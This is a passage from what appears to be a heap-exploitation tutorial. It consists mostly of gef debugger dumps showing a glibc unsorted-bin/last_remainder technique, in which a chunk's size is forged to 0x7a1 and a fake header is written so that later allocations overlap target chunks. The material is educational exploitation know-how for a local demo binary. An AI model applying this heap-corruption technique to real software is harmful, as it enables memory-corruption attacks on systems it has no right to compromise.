0x00007fffffffdf70│+0x0000: 0x00005555555592a0  →  0x00007ffff7e2d170  →  0x00007ffff7e2d160  →  0x00007ffff7e2d150  →  0x00007ffff7e2d140  →  0x00007ffff7e2d130  →  0x00007ffff7e2d120    ← $rsp
0x00007fffffffdf78│+0x0008: 0x00005555555598a0  →  0x0000000000000000
0x00007fffffffdf80│+0x0010: 0x0000555555559930  →  0x0000000000000000
0x00007fffffffdf88│+0x0018: 0x00005555555599c0  →  0x0000000000000000
0x00007fffffffdf90│+0x0020: 0x0000555555559a50  →  0x0000000000000000
0x00007fffffffdf98│+0x0028: 0x0000000000000000
0x00007fffffffdfa0│+0x0030: 0x0000000000000000
0x00007fffffffdfa8│+0x0038: 0x00007ffff7fe5080  →  <dl_main+0> endbr64
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551ec <main+99>     call   0x555555555090 <malloc@plt>
   0x5555555551f1 <main+104>    mov edi, 0x10
   0x5555555551f6 <main+109>    call   0x555555555090 <malloc@plt>
 → 0x5555555551fb <main+114>    mov rax, QWORD PTR [rbp-0x40]
   0x5555555551ff <main+118>    add rax, 0x18
   0x555555555203 <main+122>    mov QWORD PTR [rax], 0x7a1
   0x55555555520a <main+129>    mov rax, QWORD PTR [rbp-0x40]
   0x55555555520e <main+133>    add rax, 0x10
   0x555555555212 <main+137>    mov QWORD PTR [rax], 0x0
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "last_remainder", stopped 0x5555555551fb in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555551fb → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p main_arena
$2 = {
  mutex = 0x0,
  flags = 0x0,
  have_fastchunks = 0x0,
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
  top = 0x55555555a1e0,
  last_remainder = 0x5555555592b0,
  bins = {0x5555555592b0, 0x5555555592b0, 0x7ffff7e2cd10 <main_arena+112>, 0x7ffff7e2cd10 <main_arena+112>, 0x7ffff7e2cd20 <main_arena+128>, 0x7ffff7e2cd20 <main_arena+128>, 0x7ffff7e2cd30 <main_arena+144>, 0x7ffff7e2cd30 <main_arena+144>, 0x7ffff7e2cd40 <main_arena+160>, 0x7ffff7e2cd40 <main_arena+160>, 0x7ffff7e2cd50 <main_arena+176>, 0x7ffff7e2cd50 <main_arena+176>, 0x7ffff7e2cd60 <main_arena+192>, 0x7ffff7e2cd60 <main_arena+192>, 0x7ffff7e2cd70 <main_arena+208>, 0x7ffff7e2cd70 <main_arena+208>, 0x7ffff7e2cd80 <main_arena+224>, 0x7ffff7e2cd80 <main_arena+224>, 0x7ffff7e2cd90 <main_arena+240>, 0x7ffff7e2cd90 <main_arena+240>, 0x7ffff7e2cda0 <main_arena+256>, 0x7ffff7e2cda0 <main_arena+256>, 0x7ffff7e2cdb0 <main_arena+272>, 0x7ffff7e2cdb0 <main_arena+272>, 0x7ffff7e2cdc0 <main_arena+288>, 0x7ffff7e2cdc0 <main_arena+288>, 0x7ffff7e2cdd0 <main_arena+304>, 0x7ffff7e2cdd0 <main_arena+304>, 0x7ffff7e2cde0 <main_arena+320>, 0x7ffff7e2cde0 <main_arena+320>, 0x7ffff7e2cdf0 <main_arena+336>, 0x7ffff7e2cdf0 <main_arena+336>, 0x7ffff7e2ce00 <main_arena+352>, 0x7ffff7e2ce00 <main_arena+352>, 0x7ffff7e2ce10 <main_arena+368>, 0x7ffff7e2ce10 <main_arena+368>, 0x7ffff7e2ce20 <main_arena+384>, 0x7ffff7e2ce20 <main_arena+384>, 0x7ffff7e2ce30 <main_arena+400>, 0x7ffff7e2ce30 <main_arena+400>, 0x7ffff7e2ce40 <main_arena+416>, 0x7ffff7e2ce40 <main_arena+416>, 0x7ffff7e2ce50 <main_arena+432>, 0x7ffff7e2ce50 <main_arena+432>, 0x7ffff7e2ce60 <main_arena+448>, 0x7ffff7e2ce60 <main_arena+448>, 0x7ffff7e2ce70 <main_arena+464>, 0x7ffff7e2ce70 <main_arena+464>, 0x7ffff7e2ce80 <main_arena+480>, 0x7ffff7e2ce80 <main_arena+480>, 0x7ffff7e2ce90 <main_arena+496>, 0x7ffff7e2ce90 <main_arena+496>, 0x7ffff7e2cea0 <main_arena+512>, 0x7ffff7e2cea0 <main_arena+512>, 0x7ffff7e2ceb0 <main_arena+528>, 0x7ffff7e2ceb0 <main_arena+528>, 0x7ffff7e2cec0 <main_arena+544>, 0x7ffff7e2cec0 <main_arena+544>, 0x7ffff7e2ced0 <main_arena+560>, 0x7ffff7e2ced0 <main_arena+560>, 0x7ffff7e2cee0 <main_arena+576>, 0x7ffff7e2cee0 <main_arena+576>, 0x7ffff7e2cef0 <main_arena+592>, 0x7ffff7e2cef0 <main_arena+592>, 0x7ffff7e2cf00 <main_arena+608>, 0x7ffff7e2cf00 <main_arena+608>, 0x7ffff7e2cf10 <main_arena+624>, 0x7ffff7e2cf10 <main_arena+624>, 0x7ffff7e2cf20 <main_arena+640>, 0x7ffff7e2cf20 <main_arena+640>, 0x7ffff7e2cf30 <main_arena+656>, 0x7ffff7e2cf30 <main_arena+656>, 0x7ffff7e2cf40 <main_arena+672>, 0x7ffff7e2cf40 <main_arena+672>, 0x7ffff7e2cf50 <main_arena+688>, 0x7ffff7e2cf50 <main_arena+688>, 0x7ffff7e2cf60 <main_arena+704>, 0x7ffff7e2cf60 <main_arena+704>, 0x7ffff7e2cf70 <main_arena+720>, 0x7ffff7e2cf70 <main_arena+720>, 0x7ffff7e2cf80 <main_arena+736>, 0x7ffff7e2cf80 <main_arena+736>, 0x7ffff7e2cf90 <main_arena+752>, 0x7ffff7e2cf90 <main_arena+752>, 0x7ffff7e2cfa0 <main_arena+768>, 0x7ffff7e2cfa0 <main_arena+768>, 0x7ffff7e2cfb0 <main_arena+784>, 0x7ffff7e2cfb0 <main_arena+784>, 0x7ffff7e2cfc0 <main_arena+800>, 0x7ffff7e2cfc0 <main_arena+800>, 0x7ffff7e2cfd0 <main_arena+816>, 0x7ffff7e2cfd0 <main_arena+816>, 0x7ffff7e2cfe0 <main_arena+832>, 0x7ffff7e2cfe0 <main_arena+832>, 0x7ffff7e2cff0 <main_arena+848>, 0x7ffff7e2cff0 <main_arena+848>, 0x7ffff7e2d000 <main_arena+864>, 0x7ffff7e2d000 <main_arena+864>, 0x7ffff7e2d010 <main_arena+880>, 0x7ffff7e2d010 <main_arena+880>, 0x7ffff7e2d020 <main_arena+896>, 0x7ffff7e2d020 <main_arena+896>, 0x7ffff7e2d030 <main_arena+912>, 0x7ffff7e2d030 <main_arena+912>, 0x7ffff7e2d040 <main_arena+928>, 0x7ffff7e2d040 <main_arena+928>, 0x7ffff7e2d050 <main_arena+944>, 0x7ffff7e2d050 <main_arena+944>, 0x7ffff7e2d060 <main_arena+960>, 0x7ffff7e2d060 <main_arena+960>, 0x7ffff7e2d070 <main_arena+976>, 0x7ffff7e2d070 <main_arena+976>, 0x7ffff7e2d080 <main_arena+992>, 0x7ffff7e2d080 <main_arena+992>, 0x7ffff7e2d090 <main_arena+1008>, 0x7ffff7e2d090 <main_arena+1008>, 0x7ffff7e2d0a0 <main_arena+1024>, 0x7ffff7e2d0a0 <main_arena+1024>, 0x7ffff7e2d0b0 <main_arena+1040>, 0x7ffff7e2d0b0 <main_arena+1040>, 0x7ffff7e2d0c0 <main_arena+1056>, 0x7ffff7e2d0c0 <main_arena+1056>, 0x7ffff7e2d0d0 <main_arena+1072>, 0x7ffff7e2d0d0 <main_arena+1072>, 0x7ffff7e2d0e0 <main_arena+1088>, 0x7ffff7e2d0e0 <main_arena+1088>, 0x7ffff7e2d0f0 <main_arena+1104>, 0x7ffff7e2d0f0 <main_arena+1104>, 0x7ffff7e2d100 <main_arena+1120>, 0x7ffff7e2d100 <main_arena+1120>, 0x7ffff7e2d110 <main_arena+1136>, 0x7ffff7e2d110 <main_arena+1136>, 0x7ffff7e2d120 <main_arena+1152>, 0x7ffff7e2d120 <main_arena+1152>, 0x7ffff7e2d130 <main_arena+1168>, 0x7ffff7e2d130 <main_arena+1168>, 0x7ffff7e2d140 <main_arena+1184>, 0x7ffff7e2d140 <main_arena+1184>, 0x7ffff7e2d150 <main_arena+1200>, 0x7ffff7e2d150 <main_arena+1200>, 0x7ffff7e2d160 <main_arena+1216>, 0x7ffff7e2d160 <main_arena+1216>, 0x7ffff7e2d170 <main_arena+1232>, 0x7ffff7e2d170 <main_arena+1232>, 0x7ffff7e2d180 <main_arena+1248>, 0x7ffff7e2d180 <main_arena+1248>, 0x7ffff7e2d190 <main_arena+1264>, 0x7ffff7e2d190 <main_arena+1264>, 0x7ffff7e2d1a0 <main_arena+1280>, 0x7ffff7e2d1a0 <main_arena+1280>, 0x7ffff7e2d1b0 <main_arena+1296>, 0x7ffff7e2d1b0 <main_arena+1296>, 0x7ffff7e2d1c0 <main_arena+1312>, 0x7ffff7e2d1c0 <main_arena+1312>, 0x7ffff7e2d1d0 <main_arena+1328>, 0x7ffff7e2d1d0 <main_arena+1328>, 0x7ffff7e2d1e0 <main_arena+1344>, 0x7ffff7e2d1e0 <main_arena+1344>, 0x7ffff7e2d1f0 <main_arena+1360>, 0x7ffff7e2d1f0 <main_arena+1360>, 0x7ffff7e2d200 <main_arena+1376>, 0x7ffff7e2d200 <main_arena+1376>, 0x7ffff7e2d210 <main_arena+1392>, 0x7ffff7e2d210 <main_arena+1392>, 0x7ffff7e2d220 <main_arena+1408>, 0x7ffff7e2d220 <main_arena+1408>, 0x7ffff7e2d230 <main_arena+1424>, 0x7ffff7e2d230 <main_arena+1424>, 0x7ffff7e2d240 <main_arena+1440>, 0x7ffff7e2d240 <main_arena+1440>, 0x7ffff7e2d250 <main_arena+1456>, 0x7ffff7e2d250 <main_arena+1456>, 0x7ffff7e2d260 <main_arena+1472>, 0x7ffff7e2d260 <main_arena+1472>, 0x7ffff7e2d270 <main_arena+1488>, 0x7ffff7e2d270 <main_arena+1488>, 0x7ffff7e2d280 <main_arena+1504>, 0x7ffff7e2d280 <main_arena+1504>, 0x7ffff7e2d290 <main_arena+1520>, 0x7ffff7e2d290 <main_arena+1520>, 0x7ffff7e2d2a0 <main_arena+1536>, 0x7ffff7e2d2a0 <main_arena+1536>, 0x7ffff7e2d2b0 <main_arena+1552>, 0x7ffff7e2d2b0 <main_arena+1552>, 0x7ffff7e2d2c0 <main_arena+1568>, 0x7ffff7e2d2c0 <main_arena+1568>, 0x7ffff7e2d2d0 <main_arena+1584>, 0x7ffff7e2d2d0 <main_arena+1584>, 0x7ffff7e2d2e0 <main_arena+1600>, 0x7ffff7e2d2e0 <main_arena+1600>, 0x7ffff7e2d2f0 <main_arena+1616>, 0x7ffff7e2d2f0 <main_arena+1616>, 0x7ffff7e2d300 <main_arena+1632>, 0x7ffff7e2d300 <main_arena+1632>, 0x7ffff7e2d310 <main_arena+1648>, 0x7ffff7e2d310 <main_arena+1648>, 0x7ffff7e2d320 <main_arena+1664>, 0x7ffff7e2d320 <main_arena+1664>, 0x7ffff7e2d330 <main_arena+1680>, 0x7ffff7e2d330 <main_arena+1680>, 0x7ffff7e2d340 <main_arena+1696>, 0x7ffff7e2d340 <main_arena+1696>, 0x7ffff7e2d350 <main_arena+1712>, 0x7ffff7e2d350 <main_arena+1712>, 0x7ffff7e2d360 <main_arena+1728>, 0x7ffff7e2d360 <main_arena+1728>, 0x7ffff7e2d370 <main_arena+1744>, 0x7ffff7e2d370 <main_arena+1744>, 0x7ffff7e2d380 <main_arena+1760>, 0x7ffff7e2d380 <main_arena+1760>, 0x7ffff7e2d390 <main_arena+1776>, 0x7ffff7e2d390 <main_arena+1776>, 0x7ffff7e2d3a0 <main_arena+1792>, 0x7ffff7e2d3a0 <main_arena+1792>, 0x7ffff7e2d3b0 <main_arena+1808>, 0x7ffff7e2d3b0 <main_arena+1808>, 0x7ffff7e2d3c0 <main_arena+1824>, 0x7ffff7e2d3c0 <main_arena+1824>, 0x7ffff7e2d3d0 <main_arena+1840>, 0x7ffff7e2d3d0 <main_arena+1840>, 0x7ffff7e2d3e0 <main_arena+1856>, 0x7ffff7e2d3e0 <main_arena+1856>, 0x7ffff7e2d3f0 <main_arena+1872>, 0x7ffff7e2d3f0 <main_arena+1872>, 0x7ffff7e2d400 <main_arena+1888>, 0x7ffff7e2d400 <main_arena+1888>, 0x7ffff7e2d410 <main_arena+1904>, 0x7ffff7e2d410 <main_arena+1904>, 0x7ffff7e2d420 <main_arena+1920>, 0x7ffff7e2d420 <main_arena+1920>, 0x7ffff7e2d430 <main_arena+1936>, 0x7ffff7e2d430 <main_arena+1936>, 0x7ffff7e2d440 <main_arena+1952>, 0x7ffff7e2d440 <main_arena+1952>, 0x7ffff7e2d450 <main_arena+1968>, 0x7ffff7e2d450 <main_arena+1968>, 0x7ffff7e2d460 <main_arena+1984>, 0x7ffff7e2d460 <main_arena+1984>, 0x7ffff7e2d470 <main_arena+2000>, 0x7ffff7e2d470 <main_arena+2000>, 0x7ffff7e2d480 <main_arena+2016>, 0x7ffff7e2d480 <main_arena+2016>, 0x7ffff7e2d490 <main_arena+2032>, 0x7ffff7e2d490 <main_arena+2032>, 0x7ffff7e2d4a0 <main_arena+2048>, 0x7ffff7e2d4a0 <main_arena+2048>, 0x7ffff7e2d4b0 <main_arena+2064>, 0x7ffff7e2d4b0 <main_arena+2064>, 0x7ffff7e2d4c0 <main_arena+2080>, 0x7ffff7e2d4c0 <main_arena+2080>, 0x7ffff7e2d4d0 <main_arena+2096>, 0x7ffff7e2d4d0 <main_arena+2096>, 0x7ffff7e2d4e0 <main_arena+2112>, 0x7ffff7e2d4e0 <main_arena+2112>},
  binmap = {0x0, 0x0, 0x100, 0x0},
  next = 0x7ffff7e2cca0 <main_arena>,
  next_free = 0x0,
  attached_threads = 0x1,
  system_mem = 0x21000,
  max_system_mem = 0x21000
}
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x5555555592b0, bk=0x5555555592b0
 →   Chunk(addr=0x5555555592c0, size=0x5e0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/300g 0x5555555592b0
0x5555555592b0: 0x555555559290  0x5e1
0x5555555592c0: 0x7ffff7e2cd00  0x7ffff7e2cd00
0x5555555592d0: 0x0 0x0
0x5555555592e0: 0x0 0x0
0x5555555592f0: 0x0 0x0
0x555555559300: 0x0 0x0
0x555555559310: 0x0 0x0
0x555555559320: 0x0 0x0
0x555555559330: 0x0 0x0
0x555555559340: 0x0 0x0
0x555555559350: 0x0 0x0
0x555555559360: 0x0 0x0
0x555555559370: 0x0 0x0
0x555555559380: 0x0 0x0
0x555555559390: 0x0 0x0
0x5555555593a0: 0x0 0x0
0x5555555593b0: 0x0 0x0
0x5555555593c0: 0x0 0x0
0x5555555593d0: 0x0 0x0
0x5555555593e0: 0x0 0x0
0x5555555593f0: 0x0 0x0
0x555555559400: 0x0 0x0
0x555555559410: 0x0 0x0
0x555555559420: 0x0 0x0
0x555555559430: 0x0 0x0
0x555555559440: 0x0 0x0
0x555555559450: 0x0 0x0
0x555555559460: 0x0 0x0
0x555555559470: 0x0 0x0
0x555555559480: 0x0 0x0
0x555555559490: 0x0 0x0
0x5555555594a0: 0x0 0x0
0x5555555594b0: 0x0 0x0
0x5555555594c0: 0x0 0x0
0x5555555594d0: 0x0 0x0
0x5555555594e0: 0x0 0x0
0x5555555594f0: 0x0 0x0
0x555555559500: 0x0 0x0
0x555555559510: 0x0 0x0
0x555555559520: 0x0 0x0
0x555555559530: 0x0 0x0
0x555555559540: 0x0 0x0
0x555555559550: 0x0 0x0
0x555555559560: 0x0 0x0
0x555555559570: 0x0 0x0
0x555555559580: 0x0 0x0
0x555555559590: 0x0 0x0
0x5555555595a0: 0x0 0x0
0x5555555595b0: 0x0 0x0
0x5555555595c0: 0x0 0x0
0x5555555595d0: 0x0 0x0
0x5555555595e0: 0x0 0x0
0x5555555595f0: 0x0 0x0
0x555555559600: 0x0 0x0
0x555555559610: 0x0 0x0
0x555555559620: 0x0 0x0
0x555555559630: 0x0 0x0
0x555555559640: 0x0 0x0
0x555555559650: 0x0 0x0
0x555555559660: 0x0 0x0
0x555555559670: 0x0 0x0
0x555555559680: 0x0 0x0
0x555555559690: 0x0 0x0
0x5555555596a0: 0x0 0x0
0x5555555596b0: 0x0 0x0
0x5555555596c0: 0x0 0x0
0x5555555596d0: 0x0 0x0
0x5555555596e0: 0x0 0x0
0x5555555596f0: 0x0 0x0
0x555555559700: 0x0 0x0
0x555555559710: 0x0 0x0
0x555555559720: 0x0 0x0
0x555555559730: 0x0 0x0
0x555555559740: 0x0 0x0
0x555555559750: 0x0 0x0
0x555555559760: 0x0 0x0
0x555555559770: 0x0 0x0
0x555555559780: 0x0 0x0
0x555555559790: 0x0 0x0
0x5555555597a0: 0x0 0x0
0x5555555597b0: 0x0 0x0
0x5555555597c0: 0x0 0x0
0x5555555597d0: 0x0 0x0
0x5555555597e0: 0x0 0x0
0x5555555597f0: 0x0 0x0
0x555555559800: 0x0 0x0
0x555555559810: 0x0 0x0
0x555555559820: 0x0 0x0
0x555555559830: 0x0 0x0
0x555555559840: 0x0 0x0
0x555555559850: 0x0 0x0
0x555555559860: 0x0 0x0
0x555555559870: 0x0 0x0
0x555555559880: 0x0 0x0
0x555555559890: 0x5e0   0x90
0x5555555598a0: 0x0 0x0
0x5555555598b0: 0x0 0x0
0x5555555598c0: 0x0 0x0
0x5555555598d0: 0x0 0x0
0x5555555598e0: 0x0 0x0
0x5555555598f0: 0x0 0x0
0x555555559900: 0x0 0x0
0x555555559910: 0x0 0x0
0x555555559920: 0x0 0x91
0x555555559930: 0x0 0x0
0x555555559940: 0x0 0x0
0x555555559950: 0x0 0x0
0x555555559960: 0x0 0x0
0x555555559970: 0x0 0x0
0x555555559980: 0x0 0x0
0x555555559990: 0x0 0x0
0x5555555599a0: 0x0 0x0
0x5555555599b0: 0x0 0x91
0x5555555599c0: 0x0 0x0
0x5555555599d0: 0x0 0x0
0x5555555599e0: 0x0 0x0
0x5555555599f0: 0x0 0x0
0x555555559a00: 0x0 0x0
0x555555559a10: 0x0 0x0
0x555555559a20: 0x0 0x0
0x555555559a30: 0x0 0x0
0x555555559a40: 0x0 0x91
0x555555559a50: 0x0 0x0
0x555555559a60: 0x0 0x0
0x555555559a70: 0x0 0x0
0x555555559a80: 0x0 0x0
0x555555559a90: 0x0 0x0
0x555555559aa0: 0x0 0x0
0x555555559ab0: 0x0 0x0
0x555555559ac0: 0x0 0x0
0x555555559ad0: 0x0 0x711
0x555555559ae0: 0x0 0x0
0x555555559af0: 0x0 0x0
0x555555559b00: 0x0 0x0
0x555555559b10: 0x0 0x0
0x555555559b20: 0x0 0x0
0x555555559b30: 0x0 0x0
0x555555559b40: 0x0 0x0
0x555555559b50: 0x0 0x0
0x555555559b60: 0x0 0x0
0x555555559b70: 0x0 0x0
0x555555559b80: 0x0 0x0
0x555555559b90: 0x0 0x0
0x555555559ba0: 0x0 0x0
0x555555559bb0: 0x0 0x0
0x555555559bc0: 0x0 0x0
0x555555559bd0: 0x0 0x0
0x555555559be0: 0x0 0x0
0x555555559bf0: 0x0 0x0
0x555555559c00: 0x0 0x0
```

So we see, the last remainder has been set to `0x5555555592b0`. In addition to that, we see our three target chunks at `0x5555555598a0`, `0x555555559930`, and `0x5555555599c0`.

Now, we will expand the size of the large bin chunk, to be `0x7a1`, and the chunk header of the next chunk at `0x555555559a50` (`0x555555559a50 = 0x5555555592b0 + 0x7a0`):

```
gef➤  c
Continuing.

Breakpoint 3, 0x0000555555555238 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559a58  →  0x0000000000000080
$rbx   : 0x0             
$rcx   : 0x0000555555559290  →  0x0000000000000000
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf70  →  0x00005555555592a0  →  0x00007ffff7e2d170  →  0x00007ffff7e2d160  →  0x00007ffff7e2d150  →  0x00007ffff7e2d140  →  0x00007ffff7e2d130  →  0x00007ffff7e2d120
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x100           
$rdi   : 0x5d0           
$rip   : 0x0000555555555238  →  <main+175> call 0x555555555090 <malloc@plt>
$r8 : 0x2            
$r9 : 0x0            
$r10   : 0x100           
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3c3  →  "/Hackery/shogun/pwn_demos/unsorted_bin/la[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf70│+0x0000: 0x00005555555592a0  →  0x00007ffff7e2d170  →  0x00007ffff7e2d160  →  0x00007ffff7e2d150  →  0x00007ffff7e2d140  →  0x00007ffff7e2d130  →  0x00007ffff7e2d120    ← $rsp
0x00007fffffffdf78│+0x0008: 0x00005555555598a0  →  0x0000000000000000
0x00007fffffffdf80│+0x0010: 0x0000555555559930  →  0x0000000000000000
0x00007fffffffdf88│+0x0018: 0x00005555555599c0  →  0x0000000000000000
0x00007fffffffdf90│+0x0020: 0x0000555555559a50  →  0x00000000000007a0
0x00007fffffffdf98│+0x0028: 0x0000000000000000
0x00007fffffffdfa0│+0x0030: 0x0000000000000000
0x00007fffffffdfa8│+0x0038: 0x00007ffff7fe5080  →  <dl_main+0> endbr64
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555228 <main+159>    add rax, 0x8
   0x55555555522c <main+163>    mov QWORD PTR [rax], 0x80
   0x555555555233 <main+170>    mov edi, 0x5d0
 → 0x555555555238 <main+175>    call   0x555555555090 <malloc@plt>
   ↳  0x555555555090 <malloc@plt+0>   endbr64
    0x555555555094 <malloc@plt+4>   bnd jmp QWORD PTR [rip+0x2f35]      # 0x555555557fd0 <malloc@got.plt>
    0x55555555509b <malloc@plt+11>  nop DWORD PTR [rax+rax*1+0x0]
    0x5555555550a0 <_start+0>       endbr64
    0x5555555550a4 <_start+4>       xor ebp, ebp
    0x5555555550a6 <_start+6>       mov r9, rdx
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x00000000000005d0,
   $rsi = 0x0000000000000100
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "last_remainder", stopped 0x555555555238 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555238 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/20g 0x5555555592b0
0x5555555592b0: 0x0 0x7a1
0x5555555592c0: 0x7ffff7e2cd00  0x7ffff7e2cd00
0x5555555592d0: 0x0 0x0
0x5555555592e0: 0x0 0x0
0x5555555592f0: 0x0 0x0
0x555555559300: 0x0 0x0
0x555555559310: 0x0 0x0
0x555555559320: 0x0 0x0
0x555555559330: 0x0 0x0
0x555555559340: 0x0 0x0
gef➤  x/10g 0x555555559a50
0x555555559a50: 0x7a0   0x80
0x555555559a60: 0x0 0x0
0x555555559a70: 0x0 0x0
0x555555559a80: 0x0 0x0
0x555555559a90: 0x0 0x0

gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x5555555592b0, bk=0x5555555592b0
 →   Chunk(addr=0x5555555592c0, size=0x7a0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

So we see, that we have expanded the size of that chunk. Now, we will allocate a chunk from it, to line it up with `chunk0`:

```
gef➤  c
Continuing.

Breakpoint 4, 0x0000555555555242 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00005555555592c0  →  0x00007ffff7e2d1d0  →  0x00007ffff7e2d1c0  →  0x00007ffff7e2d1b0  →  0x00007ffff7e2d1a0  →  0x00007ffff7e2d190  →  0x00007ffff7e2d180  →  0x00007ffff7e2d170
$rbx   : 0x0             
$rcx   : 0x00005555555592b0  →  0x0000000000000000
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf70  →  0x00005555555592a0  →  0x00007ffff7e2d170  →  0x00007ffff7e2d160  →  0x00007ffff7e2d150  →  0x00007ffff7e2d140  →  0x00007ffff7e2d130  →  0x00007ffff7e2d120
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x4000          
$rdi   : 0x80            
$rip   : 0x0000555555555242  →  <main+185> call 0x555555555090 <malloc@plt>
$r8 : 0x2            
$r9 : 0x0            
$r10   : 0x4000          
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3c3  →  "/Hackery/shogun/pwn_demos/unsorted_bin/la[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf70│+0x0000: 0x00005555555592a0  →  0x00007ffff7e2d170  →  0x00007ffff7e2d160  →  0x00007ffff7e2d150  →  0x00007ffff7e2d140  →  0x00007ffff7e2d130  →  0x00007ffff7e2d120    ← $rsp
0x00007fffffffdf78│+0x0008: 0x00005555555598a0  →  0x00007ffff7e2cd00  →  0x000055555555a1e0  →  0x0000000000000000
0x00007fffffffdf80│+0x0010: 0x0000555555559930  →  0x0000000000000000
0x00007fffffffdf88│+0x0018: 0x00005555555599c0  →  0x0000000000000000
0x00007fffffffdf90│+0x0020: 0x0000555555559a50  →  0x00000000000001c0
0x00007fffffffdf98│+0x0028: 0x0000000000000000
0x00007fffffffdfa0│+0x0030: 0x0000000000000000
0x00007fffffffdfa8│+0x0038: 0x00007ffff7fe5080  →  <dl_main+0> endbr64
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555233 <main+170>    mov edi, 0x5d0
   0x555555555238 <main+175>    call   0x555555555090 <malloc@plt>
   0x55555555523d <main+180>    mov edi, 0x80
 → 0x555555555242 <main+185>    call   0x555555555090 <malloc@plt>
   ↳  0x555555555090 <malloc@plt+0>   endbr64
    0x555555555094 <malloc@plt+4>   bnd jmp QWORD PTR [rip+0x2f35]      # 0x555555557fd0 <malloc@got.plt>
    0x55555555509b <malloc@plt+11>  nop DWORD PTR [rax+rax*1+0x0]
    0x5555555550a0 <_start+0>       endbr64
    0x5555555550a4 <_start+4>       xor ebp, ebp
    0x5555555550a6 <_start+6>       mov r9, rdx
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x0000000000000080,
   $rsi = 0x0000000000004000
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "last_remainder", stopped 0x555555555242 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555242 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
